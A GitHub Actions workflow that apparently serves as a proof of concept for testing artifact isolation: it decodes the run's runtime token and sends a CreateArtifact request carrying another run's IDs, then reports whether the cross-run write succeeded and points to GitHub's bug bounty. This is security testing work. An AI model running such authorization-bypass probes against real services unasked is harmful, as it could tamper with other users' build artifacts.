name: 'Artifact isolation test - attacker-controlled run (job A)'

# Run this SECOND
on:
  workflow_dispatch:
    inputs:
      target_run_backend_id:
        description: "job B's workflowRunBackendId (from job-b.yml output)"
        required: true
      target_job_backend_id:
        description: "job B's workflowJobRunBackendId (from job-b.yml output)"
        required: true

jobs:
  attempt-cross-run-write:
    runs-on: ubuntu-latest
    steps:
      - name: Attempt CreateArtifact with job B's IDs, authenticated as job A
        uses: actions/github-script@v7
        env:
          TARGET_RUN_ID: ${{ inputs.target_run_backend_id }}
          TARGET_JOB_ID: ${{ inputs.target_job_backend_id }}
        with:
          script: |
            const jwt = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!jwt) throw new Error('ACTIONS_RUNTIME_TOKEN not present in action context');
            if (!resultsUrl) throw new Error('ACTIONS_RESULTS_URL not present in action context');

            // Show this run's own IDs, for contrast with the target IDs.
            const payload = JSON.parse(
              Buffer.from(jwt.split('.')[1], 'base64url').toString()
            );
            const ownScope = payload.scp
              .split(' ')
              .find(s => s.startsWith('Actions.Results:'));
            const [, ownRun, ownJob] = ownScope.split(':');
            core.info("This run's own workflowRunBackendId:    " + ownRun);
            core.info("This run's own workflowJobRunBackendId: " + ownJob);

            const body = JSON.stringify({
              workflowRunBackendId: process.env.TARGET_RUN_ID,
              workflowJobRunBackendId: process.env.TARGET_JOB_ID,
              name: 'cross-run-write-poc',
              version: 7
            });

            const url = resultsUrl.replace(/\/$/, '') +
              '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact';

            const res = await fetch(url, {
              method: 'POST',
              headers: {
                'Authorization': 'Bearer ' + jwt,
                'Content-Type': 'application/json'
              },
              body
            });

            const text = await res.text();
            core.info('HTTP status: ' + res.status);
            core.info('Response body: ' + text);

            if (res.ok) {
              core.warning('Cross-run write appears to have SUCCEEDED. Do not proceed further — report to GitHub Security Bug Bounty (bounty.github.com) instead of investigating alone.');
            } else {
              core.info('Cross-run write was rejected, as expected. Isolation held.');
            }
